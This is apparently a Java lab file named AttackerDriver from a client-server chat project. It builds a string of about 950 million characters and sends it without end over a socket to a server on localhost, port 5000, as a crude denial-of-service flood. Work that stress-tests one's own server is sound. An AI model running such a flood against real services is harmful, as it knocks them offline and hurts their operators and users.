package com.multi;

import java.io.PrintWriter;
import java.net.Socket;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Scanner;
import java.util.concurrent.TimeUnit;

public class AttackerDriver {

    public static void main(String[] args) {

        char[] chars = new char[1024*1024*950];
        // Optional step - unnecessary if you're happy with the array being full of \0
        Arrays.fill(chars,'I');
        final String TEXT5MB=new String(chars);

        final String msg=TEXT5MB;


        try (Socket socket = new Socket("localhost", 5000)) {
            // Sending message to server.
            PrintWriter writer = new PrintWriter(socket.getOutputStream(), true);

            AttackerThread threadAttacker = new AttackerThread(socket);
            new Thread(threadAttacker).start();



            writer.println("Node "
                    + ": has joined Server.");
            do {
                String message = ("Attacker : ");

                if (msg.equalsIgnoreCase("exit")) {
                    writer.println("exit");
                    break;
                }
                //System.out.println("Enter number of loops : ");
                long loops = 1000000;//sc.nextLong();

                //for(long i=0;i<loops;i++)
                while(true)
//                    new Thread(new Runnable() {
//                        @Override public void run() {
//                            // do stuff in this thread
//                            writer.println(message + msg);
//                        }
//                    }).start();
//                    TimeUnit.SECONDS.sleep(10);
                writer.println(message + msg);


            } while (!msg.equalsIgnoreCase("exit"));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}